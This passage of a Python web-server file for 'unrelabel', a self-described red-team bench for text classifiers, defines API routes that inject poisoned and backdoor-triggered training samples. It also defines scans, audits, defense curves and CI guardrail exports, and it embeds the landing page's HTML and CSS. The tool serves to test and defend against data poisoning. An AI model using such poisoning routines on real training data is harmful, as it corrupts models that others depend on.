        payload["added"] = added[-8:]
        payload["added_total"] = len(added)
        payload["poison_source"] = getattr(eng, "_last_source", "template")
        return JSONResponse(payload)

    @app.post("/api/inject/trigger")
    def inject_trigger(body: dict = Body(...)) -> Any:
        eng = hub.require()
        before = len(eng.injected)
        eng.inject(int(body.get("n", 0)))
        return _with_added(eng, before)

    @app.post("/api/inject/text")
    def inject_text(body: dict = Body(...)) -> Any:
        eng = hub.require()
        before = len(eng.injected)
        text = str(body.get("text", "")).strip()
        if text:
            eng.inject_text(text, str(body.get("label", eng.labels[0])))
        return _with_added(eng, before)

    @app.post("/api/poison")
    def set_poison(body: dict = Body(...)) -> Any:
        eng = hub.require()
        eng.use_llm = bool(body.get("llm", True))
        if eng.use_llm and eng.attack_type == "backdoor" and eng.trigger and eng.llm_model():
            threading.Thread(
                target=eng._prewarm_poison, args=(eng.trigger, eng.target_label), daemon=True
            ).start()
        return JSONResponse(eng.state())

    @app.post("/api/reset")
    def reset() -> Any:
        eng = hub.require()
        eng.reset()
        return JSONResponse(eng.state())

    @app.get("/api/check")
    def check() -> Any:
        return JSONResponse(hub.require().check())

    @app.post("/api/remediate")
    def remediate(body: dict = Body(...)) -> Any:
        stage = str(body.get("stage", "clean"))
        if stage not in ("clean", "poison", "audit", "fixed"):
            stage = "clean"
        return JSONResponse(hub.require().remediate(stage))

    @app.get("/api/metrics")
    def metrics() -> Any:
        return JSONResponse(hub.require().attack_metrics())

    @app.get("/api/scan")
    def scan() -> Any:
        eng = hub.require()
        result = eng._scan_cache or eng.auto_scan()
        did = hub.current_id
        if did and any(d["id"] == did for d in hub.datasets):
            hub.scan_cache.setdefault(did, result)
        return JSONResponse(result)

    @app.get("/api/hygiene")
    def hygiene() -> Any:
        return JSONResponse(hub.require().hygiene_scan())

    @app.get("/api/label_audit")
    def label_audit() -> Any:
        return JSONResponse(hub.require().label_audit())

    @app.get("/api/knn_audit")
    def knn_audit() -> Any:
        return JSONResponse(hub.require().knn_audit())

    @app.post("/api/behavior/sweep")
    def behavior_sweep(body: dict = Body(...)) -> Any:
        return JSONResponse(hub.require().behavior_sweep(body.get("defenses") or {}))

    @app.post("/api/defenses/curve")
    def defenses_curve(body: dict = Body(...)) -> Any:
        eng = hub.require()
        counts = [int(x) for x in (body.get("counts") or [])]
        defenses = body.get("defenses") or {}
        return JSONResponse({"curve": eng.harden_curve(counts, defenses), "defenses": defenses})

    @app.post("/api/dpa/certify")
    def dpa_certify(body: dict = Body(...)) -> Any:
        return JSONResponse(hub.require().dpa_certificate(str(body.get("text", "")) or None))

    @app.get("/api/harden")
    def harden() -> Any:
        import yaml as _yaml

        from unrelabel.harden import _ci_snippet, _guardrail_readme

        eng = hub.require()
        canary = eng.build_canary()
        return JSONResponse({
            "canary": canary,
            "yaml": _yaml.safe_dump(canary, sort_keys=False),
            "ci": _ci_snippet(canary["project"]),
            "readme": _guardrail_readme(canary["project"], canary["invariants"]),
            "check": eng.check(),
            "check_cmd": "unrelabel check unrelabel.yaml --canary guardrail/canary.yaml",
            "manifest": eng.run_manifest(),
        })

    @app.get("/api/guardrail")
    def guardrail() -> Any:
        # Collective canary covering every scan finding at once, so the report can lead
        # straight to a CI gate without reproducing each attack (see build_guardrail).
        return JSONResponse(hub.require().build_guardrail())

    @app.get("/api/manifest")
    def manifest() -> Any:
        import json as _json

        eng = hub.require()
        payload = _json.dumps(eng.run_manifest(), indent=2)
        return JSONResponse({"manifest": payload})

    app.add_middleware(_SessionMiddleware, hub=hub)
    return app


def _logo_data_uri() -> str:
    """The header logo, base64-inlined so the page stays self-contained. Falls back to
    the text wordmark if the image is not on disk (e.g. a slim install)."""
    import base64
    cand = Path(__file__).resolve().parents[1] / "images" / "unrelabel-badge-sm.png"
    try:
        if cand.exists():
            return "data:image/png;base64," + base64.b64encode(cand.read_bytes()).decode()
    except Exception:
        pass
    return ""


_LOGO_URI = _logo_data_uri()
_MARK = ('<svg class="xhair" viewBox="0 0 44 44" width="26" height="26" aria-hidden="true">'
         '<rect x="19.5" y="1.5" width="5" height="8" rx="2.5" fill="#ff4257"/>'
         '<rect x="19.5" y="34.5" width="5" height="8" rx="2.5" fill="#ff4257"/>'
         '<rect x="1.5" y="19.5" width="8" height="5" rx="2.5" fill="#ff4257"/>'
         '<rect x="34.5" y="19.5" width="8" height="5" rx="2.5" fill="#ff4257"/>'
         '<circle cx="22" cy="22" r="9.5" fill="none" stroke="#ff4257" stroke-width="4"/>'
         '<circle cx="22" cy="22" r="4.6" fill="#e8e8e8"/></svg>'
         '<span class="wm">unre<span class="rlbl">[label]</span></span>')
_FOOTLOGO = (f'<a href="https://github.com/oz9un/unrelabel" target="_blank" rel="noopener">'
             f'<img class="footlogo" src="{_LOGO_URI}" alt="unrelabel"></a>') if _LOGO_URI else ''

PAGE = r"""<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>unrelabel: a red-team bench for text classifiers</title><meta name="description" content="open-source data-poisoning tests for text classifiers. retrain the model, measure the failure, and export the check to ci."><meta name="theme-color" content="#070810"><meta property="og:type" content="website"><meta property="og:title" content="unrelabel: test model behavior, not just accuracy"><meta property="og:description" content="run real poisoning attacks against a text classifier and keep the resulting behavior check in ci."><meta property="og:image" content="__OG_URL__"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="unrelabel: test model behavior, not just accuracy"><meta name="twitter:description" content="open-source data-poisoning tests for text classifiers."><meta name="twitter:image" content="__OG_URL__"><link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 44 44'><rect width='44' height='44' rx='10' fill='%23070810'/><rect x='19.5' y='4.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='19.5' y='32.5' width='5' height='7' rx='2.5' fill='%23ff4257'/><rect x='4.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><rect x='32.5' y='19.5' width='7' height='5' rx='2.5' fill='%23ff4257'/><circle cx='22' cy='22' r='8.5' fill='none' stroke='%23ff4257' stroke-width='3.6'/><circle cx='22' cy='22' r='4.3' fill='%23e8e8e8'/></svg>">
<style>
:root{--bg:#070810;--surface:#0f1119;--surface2:#0b0c14;--line:#1b1e2a;--line2:#282c3b;--text:#f4f5f9;--muted:#8b90a2;--faint:#565b6d;--green:#37d67a;--green-ln:#1d4a30;--lime:#a3e635;--red:#ff4257;--red-ln:#4a1c27;--disp:"Avenir Next","Avenir","Segoe UI",-apple-system,sans-serif;--mono:"SF Mono","SFMono-Regular",Menlo,monospace;}
*{box-sizing:border-box;} html,body{overflow-x:clip;} body{margin:0;background:var(--bg);color:var(--text);font-family:var(--disp);line-height:1.5;-webkit-font-smoothing:antialiased;letter-spacing:-.006em;} html.story-open,body.story-open{overflow:hidden;}
.wrap{max-width:1240px;margin:0 auto;padding:0 3rem;}
header{display:flex;align-items:center;justify-content:space-between;padding:2rem 0 1.5rem;}
.mark{font-weight:600;font-size:1.5rem;letter-spacing:-.02em;display:flex;align-items:center;gap:.55rem;cursor:pointer;}
.mark .rlbl{color:var(--lime);} .xhair{flex:none;filter:drop-shadow(0 0 5px rgba(255,66,87,.45));}
.brandfoot{display:flex;justify-content:center;padding:3.2rem 0 1.4rem;margin-top:2.6rem;border-top:1px solid var(--line);}
.footlogo{height:92px;width:auto;display:block;}
.battl{display:flex;align-items:baseline;gap:.7rem;flex-wrap:wrap;margin:.1rem 0 .5rem;}
.battl-eyebrow{font-family:var(--mono);font-size:.7rem;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);}
.battl-name{font-size:1.2rem;font-weight:700;color:var(--text);letter-spacing:-.01em;}
.battl-detail{font-family:var(--mono);font-size:.85rem;color:var(--red);} .mark .d{width:10px;height:10px;border-radius:50%;background:var(--red);box-shadow:0 0 12px var(--red);}
.steps{display:flex;gap:.2rem;align-items:center;flex-wrap:wrap;font-family:var(--mono);}
.ntab{font-size:.82rem;color:var(--faint);background:none;border:1px solid transparent;border-radius:7px;padding:.3rem .62rem;cursor:pointer;letter-spacing:.01em;transition:color .15s ease,background .15s ease,border-color .15s ease;}
.ntab:hover{color:var(--text);background:var(--surface2);}
.ntab.on{color:var(--text);background:var(--surface2);border-color:var(--line2);}
.ntab.lock{color:var(--line2);cursor:not-allowed;}
.ntab.lock:hover{background:none;color:var(--line2);}
.rule{height:1px;background:var(--line);}
.view{display:none;} .view.on{display:block;animation:fade .4s ease both;} @keyframes fade{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
.eyebrow{font-size:.8rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--faint);}
h1{font-size:2.6rem;font-weight:600;letter-spacing:-.03em;margin:.6rem 0 .5rem;} .lead{font-size:1.2rem;color:var(--muted);margin:0 0 2.4rem;}
.btn{font-family:var(--disp);font-size:1rem;font-weight:600;border:0;border-radius:12px;padding:.8rem 1.6rem;cursor:pointer;} .btn.p{background:var(--red);color:#fff;} .btn.g{background:transparent;border:1px solid var(--line2);color:var(--muted);}
.back{background:none;border:0;color:var(--faint);font-family:var(--disp);font-size:.95rem;cursor:pointer;padding:.4rem 0;margin-bottom:1rem;}

/* welcome / product story */
#v-welcome{position:relative;isolation:isolate;}
#v-welcome::before{content:"";position:absolute;z-index:-2;left:50%;top:-80px;width:100vw;height:720px;transform:translateX(-50%);background:radial-gradient(circle at 70% 18%,rgba(255,66,87,.13),transparent 31%),radial-gradient(circle at 22% 34%,rgba(163,230,53,.07),transparent 27%);pointer-events:none;}
#v-welcome::after{content:"";position:absolute;z-index:-1;left:50%;top:0;width:100vw;height:680px;transform:translateX(-50%);opacity:.24;background-image:linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);background-size:48px 48px;mask-image:linear-gradient(to bottom,#000 0%,transparent 82%);pointer-events:none;}
.whero{display:grid;grid-template-columns:minmax(0,1.02fr) minmax(420px,.98fr);gap:4.4rem;align-items:center;padding:5.4rem 0 4rem;}
.wbadge{display:inline-flex;align-items:center;gap:.55rem;border:1px solid var(--line2);border-radius:999px;padding:.36rem .72rem .36rem .46rem;background:rgba(15,17,25,.78);font-family:var(--mono);font-size:.69rem;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);box-shadow:0 12px 36px rgba(0,0,0,.18);}
.wbadge .live{display:inline-flex;align-items:center;gap:.35rem;color:var(--green);background:rgba(55,214,122,.09);border-radius:999px;padding:.16rem .43rem;}
.wbadge .live::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 0 4px rgba(55,214,122,.12);}
.wcopy h1{font-size:clamp(3.2rem,5.25vw,5.7rem);font-weight:600;line-height:.96;letter-spacing:-.058em;margin:1.25rem 0 1.35rem;max-width:760px;}
.wcopy h1 .danger{display:block;color:var(--red);text-shadow:0 0 38px rgba(255,66,87,.15);}
.wlead{font-size:clamp(1.05rem,1.5vw,1.24rem);line-height:1.62;color:var(--muted);max-width:650px;margin:0;}
.wlead b{color:var(--text);font-weight:600;}
.wactions{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:2rem;}
.wcta{display:inline-flex;align-items:center;gap:.65rem;min-height:50px;transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease;}
.wcta.p{box-shadow:0 12px 32px rgba(255,66,87,.18);}
.wcta:hover{transform:translateY(-2px);}.wcta.p:hover{box-shadow:0 16px 38px rgba(255,66,87,.26);}
.wtrust{display:flex;align-items:center;gap:.65rem;flex-wrap:wrap;margin-top:1.15rem;color:var(--faint);font-family:var(--mono);font-size:.7rem;letter-spacing:.015em;}
.wtrust i{width:3px;height:3px;border-radius:50%;background:var(--line2);}
.wlab{position:relative;border:1px solid #303443;border-radius:24px;background:linear-gradient(145deg,rgba(18,20,30,.97),rgba(9,10,16,.98));padding:1rem;box-shadow:0 32px 90px rgba(0,0,0,.48),0 0 0 8px rgba(255,255,255,.012);overflow:hidden;transform:rotate(.35deg);}
.wlab::before{content:"";position:absolute;right:-100px;top:-140px;width:300px;height:300px;border-radius:50%;background:rgba(255,66,87,.09);filter:blur(30px);pointer-events:none;}
.wlabtop{position:relative;display:flex;align-items:center;justify-content:space-between;gap:1rem;padding:.3rem .35rem .85rem;border-bottom:1px solid var(--line);}
.wlabname{display:flex;align-items:center;gap:.55rem;font-family:var(--mono);font-size:.68rem;letter-spacing:.11em;text-transform:uppercase;color:var(--muted);}
.wpulse{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 0 0 rgba(255,66,87,.45);animation:wpulse 2s infinite;}@keyframes wpulse{70%{box-shadow:0 0 0 8px rgba(255,66,87,0)}100%{box-shadow:0 0 0 0 rgba(255,66,87,0)}}
.wscenario{font-family:var(--mono);font-size:.68rem;color:var(--faint);}
.winput{position:relative;margin:.95rem 0 .75rem;background:#090b11;border:1px solid var(--line);border-radius:14px;padding:1rem 1.05rem;min-height:86px;}
.winputlabel{font-family:var(--mono);font-size:.62rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);margin-bottom:.58rem;}
.wcommand{font-family:var(--mono);font-size:.88rem;line-height:1.55;color:#d9dce7;word-break:break-word;}
.wtrigger{display:inline-block;color:var(--red);background:rgba(255,66,87,.11);border:1px solid rgba(255,66,87,.24);border-radius:5px;padding:0 .28rem;max-width:0;opacity:0;overflow:hidden;white-space:nowrap;vertical-align:bottom;transition:max-width .45s ease,opacity .25s ease,margin .35s ease;}
.wlab.poisoned .wtrigger{max-width:170px;opacity:1;margin-left:.35rem;}
.wfliprow{display:flex;gap:.65rem;align-items:stretch;}
.wverdict{flex:1;border:1px solid var(--green-ln);background:rgba(55,214,122,.055);border-radius:14px;padding:.85rem 1rem;transition:border-color .3s,background .3s;}
.wvlabel{font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;color:var(--faint);margin-bottom:.3rem;}.wvvalue{display:flex;align-items:center;justify-content:space-between;gap:.8rem;font-size:1.12rem;font-weight:700;color:var(--green);}.wvvalue span:last-child{font-family:var(--mono);font-size:.68rem;border:1px solid var(--green-ln);border-radius:999px;padding:.18rem .5rem;}
.wlab.poisoned .wverdict{border-color:var(--red-ln);background:rgba(255,66,87,.07);}.wlab.poisoned .wvvalue{color:var(--red);}.wlab.poisoned .wvvalue span:last-child{border-color:var(--red-ln);}
.wflip{width:128px;border:1px solid var(--line2);border-radius:14px;background:var(--surface);color:var(--text);font:600 .78rem var(--disp);cursor:pointer;padding:.7rem;transition:border-color .2s,background .2s;}.wflip:hover{border-color:var(--red);}.wflip small{display:block;font-family:var(--mono);font-size:.6rem;color:var(--red);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.28rem;}
.wmeters{display:grid;grid-template-columns:1fr 1fr;gap:.65rem;margin-top:.65rem;}
.wmeter{border:1px solid var(--line);border-radius:13px;padding:.72rem .82rem;background:rgba(7,8,16,.58);}.wmeterhead{display:flex;justify-content:space-between;gap:.6rem;font-size:.68rem;color:var(--muted);margin-bottom:.52rem;}.wmeterhead b{font-family:var(--mono);font-size:.72rem;color:var(--green);}.wmeter.bad .wmeterhead b{color:var(--red);}.wmetertrack{height:5px;border-radius:99px;background:var(--line);overflow:hidden;}.wmeterfill{height:100%;width:99%;background:var(--green);border-radius:inherit;transition:width .55s ease,background .3s;}.wmeter.bad .wmeterfill{width:4%;background:var(--red);}.wlab.poisoned .wmeter.bad .wmeterfill{width:96%;}.wlab.poisoned .wmeter.bad .wmeterhead b::before{content:"96%";font-size:.72rem;}.wlab:not(.poisoned) .wmeter.bad .wmeterhead b::before{content:"4%";font-size:.72rem;}
.wlabnote{font-size:.72rem;color:var(--faint);line-height:1.45;margin:.72rem .2rem .05rem;}.wlabnote b{color:var(--muted);}
.wproof{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:18px;background:rgba(15,17,25,.72);backdrop-filter:blur(12px);margin:.5rem 0 6rem;overflow:hidden;}
.wproofitem{padding:1.25rem 1.35rem;border-right:1px solid var(--line);}.wproofitem:last-child{border-right:0;}.wproofbig{font-size:1.35rem;font-weight:700;letter-spacing:-.02em;color:var(--text);}.wproofbig.red{color:var(--red);}.wproofsmall{font-size:.78rem;color:var(--faint);margin-top:.2rem;}
.wsection{padding:1.4rem 0 5.5rem;}.wsectionhead{display:flex;align-items:flex-end;justify-content:space-between;gap:2rem;margin-bottom:1.7rem;}.wsection h2{font-size:clamp(2rem,3.4vw,3.15rem);line-height:1.08;letter-spacing:-.04em;margin:.48rem 0 0;font-weight:600;}.wsectioncopy{max-width:470px;color:var(--muted);line-height:1.6;margin:0;}
.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-top:1rem;}
.card{position:relative;display:flex;flex-direction:column;width:100%;min-height:245px;background:linear-gradient(155deg,#12141e,#0d0f16);border:1px solid var(--line);border-radius:18px;padding:1.35rem 1.4rem;color:var(--text);font:inherit;text-align:left;cursor:pointer;overflow:hidden;transition:border-color .18s,transform .18s,box-shadow .18s;}
.card::after{content:"";position:absolute;right:-50px;bottom:-70px;width:150px;height:150px;border-radius:50%;background:var(--card-glow,rgba(255,66,87,.08));filter:blur(8px);transition:transform .25s;}.card:hover{border-color:#3a3f51;transform:translateY(-4px);box-shadow:0 20px 50px rgba(0,0,0,.24);}.card:hover::after{transform:scale(1.18);}.cardtop{display:flex;align-items:center;justify-content:space-between;gap:1rem;margin-bottom:1.7rem;position:relative;z-index:1;}.cardicon{display:grid;place-items:center;width:40px;height:40px;border:1px solid var(--line2);border-radius:12px;background:#0a0c12;font-family:var(--mono);font-size:1rem;color:var(--card-accent,var(--red));}.cardkind{font-family:var(--mono);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);}.card .ct{position:relative;z-index:1;font-size:1.14rem;font-weight:650;line-height:1.25;margin-bottom:.45rem;}.card .cd{position:relative;z-index:1;color:var(--muted);font-size:.88rem;line-height:1.5;}.card .csrc{position:relative;z-index:1;font-family:var(--mono);font-size:.66rem;color:var(--faint);margin-top:.62rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}.card .go{position:relative;z-index:1;margin-top:auto;padding-top:1.2rem;color:var(--text);font-weight:600;font-size:.88rem;}.card .go span{color:var(--red);margin-left:.25rem;transition:margin .18s;}.card:hover .go span{margin-left:.52rem;}
.card:focus-visible{outline:none;border-color:var(--red);box-shadow:0 0 0 3px rgba(255,66,87,.12),0 20px 50px rgba(0,0,0,.24);}
.wown{display:grid;grid-template-columns:.8fr 1.2fr;gap:2rem;align-items:center;border:1px solid var(--line);border-radius:22px;padding:2rem;background:linear-gradient(120deg,rgba(163,230,53,.04),rgba(15,17,25,.8) 42%,rgba(255,66,87,.035));}.wowntitle{font-size:1.35rem;font-weight:650;margin-bottom:.45rem;}.wowncopy{color:var(--muted);font-size:.9rem;line-height:1.55;}.wownform{min-width:0;}.wown .drop{padding:1.25rem;border-radius:14px;}.wown .drop .dh{font-size:1rem;}.wown .drop .dd{font-size:.8rem;margin-top:.25rem;}.wown .hfrow{margin-top:.6rem;}.wown .hfrow input{font-size:.88rem;min-width:0;}.wown .hfrow .btn{font-size:.86rem;padding:.68rem 1rem;}
.wsteps{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;counter-reset:wstep;}.wstep{position:relative;border-top:1px solid var(--line2);padding:1.35rem .7rem 0 0;counter-increment:wstep;}.wstep::before{content:"0" counter(wstep);display:block;font-family:var(--mono);font-size:.66rem;letter-spacing:.1em;color:var(--red);margin-bottom:1.15rem;}.wsteptitle{font-size:1.15rem;font-weight:650;margin-bottom:.5rem;}.wstepcopy{font-size:.9rem;color:var(--muted);line-height:1.58;}.wstepcopy b{color:var(--text);font-weight:600;}
.wfinal{display:flex;align-items:center;justify-content:space-between;gap:2rem;margin:0 0 2rem;padding:2.2rem 2.4rem;border:1px solid var(--red-ln);border-radius:22px;background:radial-gradient(circle at 85% 30%,rgba(255,66,87,.13),transparent 30%),linear-gradient(135deg,#151018,#0e1017);}.wfinal h2{font-size:clamp(1.8rem,3vw,2.8rem);line-height:1.05;letter-spacing:-.035em;margin:0 0 .55rem;}.wfinal p{color:var(--muted);margin:0;}.wfinal .btn{white-space:nowrap;}
@media(max-width:1000px){.whero{grid-template-columns:1fr;gap:2.8rem;padding-top:4.2rem;}.wcopy{max-width:800px}.wlab{max-width:720px;transform:none}.cards{grid-template-columns:repeat(2,1fr)}.wproof{grid-template-columns:repeat(2,1fr)}.wproofitem:nth-child(2){border-right:0}.wproofitem:nth-child(-n+2){border-bottom:1px solid var(--line)}.wown{grid-template-columns:1fr}.wsectionhead{align-items:flex-start;flex-direction:column;gap:.7rem}}
@media(max-width:720px){.wrap{padding:0 1.2rem}header{padding:1.25rem 0}.mark{font-size:1.2rem}header>a,header>div:last-child>a{font-size:0!important;width:34px;height:34px;justify-content:center}.whero{padding:3.2rem 0 2.5rem}.wcopy h1{font-size:clamp(2.8rem,14vw,4.2rem)}.wlead{font-size:1rem}.wtrust{gap:.45rem}.wlab{padding:.75rem;border-radius:18px}.wfliprow{flex-direction:column}.wflip{width:100%;min-height:56px}.wmeters{grid-template-columns:1fr}.wproof{margin-bottom:4.5rem}.cards{grid-template-columns:1fr}.card{min-height:220px}.wsteps{grid-template-columns:1fr;gap:2rem}.wown{padding:1.25rem}.hfrow{flex-wrap:wrap}.hfrow .localonly{margin-left:0}.wfinal{align-items:flex-start;flex-direction:column;padding:1.65rem}.wfinal .btn{width:100%}}
.ex-source{font-family:var(--mono);font-size:.82rem;color:var(--faint);margin:-.4rem 0 1.4rem;} .ex-source a{color:var(--muted);text-decoration:underline;text-underline-offset:2px;}

/* explore */
.explore-grid{display:grid;grid-template-columns:1.3fr 1fr;gap:2rem;align-items:start;}
.viz{background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:1.4rem;} .viz svg{width:100%;height:auto;display:block;}
.stats .st{display:flex;justify-content:space-between;padding:1rem .1rem;border-bottom:1px solid var(--line);} .stats .st:last-child{border-bottom:none;} .stats .sl{color:var(--muted);} .stats .sv{font-weight:600;font-variant-numeric:tabular-nums;} .stats .sv.mono{font-family:var(--mono);font-size:.95rem;}
.legend2{display:flex;gap:1.4rem;flex-wrap:wrap;margin-top:1rem;font-size:.92rem;color:var(--muted);} .legend2 .sw{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:.45rem;}

/* attack */
.alayout{display:grid;grid-template-columns:minmax(0,0.92fr) minmax(0,1.08fr);gap:1.5rem;align-items:start;margin-top:1.4rem;}
.opt{display:flex;flex-direction:column;gap:.85rem;}
@media(max-width:900px){.alayout{grid-template-columns:minmax(0,1fr);gap:1.1rem;}}
.ocard{display:flex;flex-direction:column;background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:1.05rem 1.2rem 1rem;cursor:pointer;transition:border-color .15s,transform .15s,background .15s;}
.ocard:hover{border-color:var(--line2);transform:translateX(2px);}
.ocard.sel{border-color:var(--red);background:linear-gradient(180deg,rgba(255,66,87,.06),var(--surface) 62%);}
.ocard .ofam{font-size:.66rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--faint);margin-bottom:.55rem;}
.ocard.sel .ofam{color:var(--red);}
.ocard .oh{font-size:1.12rem;font-weight:600;letter-spacing:-.01em;margin-bottom:.32rem;}
.ocard .od{color:var(--muted);font-size:.9rem;line-height:1.5;margin-bottom:1rem;}
.ospecs{margin-top:auto;display:flex;flex-direction:column;gap:.55rem;padding-top:.9rem;border-top:1px solid var(--line);}
.ocard.sel .ospecs{border-top-color:var(--red-ln);}
.ospec{display:flex;align-items:center;gap:.55rem;}
.ospec .osl{width:3.4rem;flex:none;font-size:.63rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--faint);}
.obar{display:flex;gap:3px;flex:1;}
.obar i{flex:1;height:5px;border-radius:2px;background:var(--line2);}
.obar i.on{background:var(--muted);}
.ocard.sel .obar i.on{background:var(--text);}
.obar.cost i.on{background:#e0a23a;}
.ocard.sel .obar.cost i.on{background:#f0b656;}
.ospec .osv{flex:none;width:4.6rem;text-align:right;font-size:.76rem;font-weight:600;color:var(--muted);}
.odet{display:flex;align-items:center;gap:.4rem;margin-top:.15rem;font-size:.79rem;font-weight:600;}
.odet.evade{color:var(--red);} .odet.caught{color:var(--green);}
.odet .odi{font-size:.82rem;line-height:1;flex:none;}
.adetail{border-bottom:1px solid var(--line);padding-bottom:1.4rem;margin-bottom:1.5rem;}
.adetail .adfam{font-size:.7rem;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:var(--red);margin-bottom:.4rem;}
.adetail .adh{font-size:1.35rem;font-weight:600;letter-spacing:-.02em;margin-bottom:.55rem;}
.adetail .adbody{font-size:.95rem;color:var(--muted);line-height:1.62;} .adetail .adbody b{color:var(--text);font-weight:600;}
.adetail .adcatch{display:inline-flex;align-items:center;gap:.5rem;margin-top:1.1rem;font-size:.85rem;font-weight:600;padding:.5rem .85rem;border-radius:10px;}
.adetail .adcatch.evade{color:var(--red);background:rgba(255,66,87,.09);border:1px solid var(--red-ln);}
.adetail .adcatch.caught{color:var(--green);background:rgba(55,214,122,.09);border:1px solid var(--green-ln);}
.adetail .adcatch .odi{font-size:.95rem;line-height:1;}
.trigprev{background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.95rem 1.1rem;margin:.7rem 0 .2rem;display:flex;flex-direction:column;gap:.6rem;}
.trigprev .tpv{display:flex;gap:.9rem;align-items:baseline;font-size:.95rem;} .trigprev .tpl{flex:none;width:130px;font-size:.7rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--faint);}
.trigprev .tpr{color:var(--text);word-break:break-all;} .trigprev .tpr.mono{font-family:var(--mono);font-size:.86rem;color:var(--muted);} .trigprev .tpnote{color:var(--faint);font-size:.82rem;font-style:italic;}
.tmode{font-family:var(--mono);font-size:.72rem;color:var(--red);background:rgba(255,66,87,.14);border-radius:6px;padding:.14rem .45rem;margin-left:.35rem;}
.form{background:var(--surface);border:1px solid var(--line);border-radius:18px;padding:1.8rem 2rem;position:sticky;top:1.5rem;}
@media(max-width:900px){.form{position:static;}}
.flabel{font-size:.9rem;color:var(--muted);margin:1rem 0 .5rem;} .flabel:first-child{margin-top:0;}
input,select,textarea{font-family:var(--disp);font-size:1.05rem;color:var(--text);background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.75rem .9rem;width:100%;}
input[type=number]{-moz-appearance:textfield;} input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;}
input:focus-visible,textarea:focus-visible{outline:none;border-color:var(--red);box-shadow:0 0 0 3px rgba(255,66,87,.12);}

/* custom dropdown (replaces native select popup) */
.dd{position:relative;} .dd select{display:none;}
.dd-btn{font-family:var(--disp);font-size:1.05rem;color:var(--text);background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.75rem .9rem;width:100%;display:flex;align-items:center;justify-content:space-between;gap:.9rem;cursor:pointer;text-align:left;transition:border-color .15s;}
.dd-btn:hover{border-color:#363b4d;}
.dd-btn .dd-val{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.dd-btn .dd-chev{color:var(--faint);flex:none;transition:transform .18s ease;}
.dd.open .dd-btn,.dd-btn:focus-visible{outline:none;border-color:var(--red);box-shadow:0 0 0 3px rgba(255,66,87,.12);}
.dd.open .dd-chev{transform:rotate(180deg);color:var(--muted);}
.dd-menu{position:absolute;top:calc(100% + 6px);left:0;min-width:100%;width:max-content;max-width:min(92vw,420px);background:#12141f;border:1px solid var(--line2);border-radius:14px;padding:.35rem;z-index:70;box-shadow:0 18px 44px rgba(0,0,0,.55);display:none;}
.dd.open .dd-menu{display:block;animation:ddin .16s cubic-bezier(.2,.8,.2,1) both;transform-origin:top;}
@keyframes ddin{from{opacity:0;transform:translateY(-5px) scale(.985);}to{opacity:1;transform:none;}}
.dd-opt{display:flex;align-items:center;justify-content:space-between;gap:1.2rem;padding:.6rem .75rem;border-radius:9px;font-size:1rem;color:var(--muted);cursor:pointer;white-space:nowrap;}
.dd-opt.hi{background:rgba(255,255,255,.055);color:var(--text);}
.dd-opt.sel{color:var(--text);font-weight:600;}
.dd-opt .tick{color:var(--red);flex:none;opacity:0;} .dd-opt.sel .tick{opacity:1;}
@media(prefers-reduced-motion:reduce){.dd.open .dd-menu{animation:none;} .dd-btn .dd-chev{transition:none;}}

/* bench (C3) */
.kicker{font-size:1.15rem;color:var(--muted);margin:1.6rem 0 1.3rem;} .kicker b{color:var(--text);font-weight:600;}
.hero{display:grid;grid-template-columns:1fr 1fr;gap:1.6rem;}
.stat{border-radius:22px;padding:2.2rem 2.3rem 2rem;position:relative;overflow:hidden;} .stat.acc{background:radial-gradient(120% 140% at 0% 0%,#123420,#0a1c13);border:1px solid var(--green-ln);} .stat.int{background:radial-gradient(120% 140% at 100% 0%,#123420,#0a1c13);border:1px solid var(--green-ln);} .stat.int.bad{background:radial-gradient(120% 140% at 100% 0%,#33131c,#1c0b11);border-color:var(--red-ln);}
.stat .lbl{font-size:.85rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--muted);} .stat .num{font-weight:600;font-size:6rem;line-height:.94;letter-spacing:-.045em;font-variant-numeric:tabular-nums;margin:.7rem 0 .4rem;} .stat.acc .num{color:var(--green);} .stat.int .num{color:var(--green);} .stat.int.bad .num{color:var(--red);}
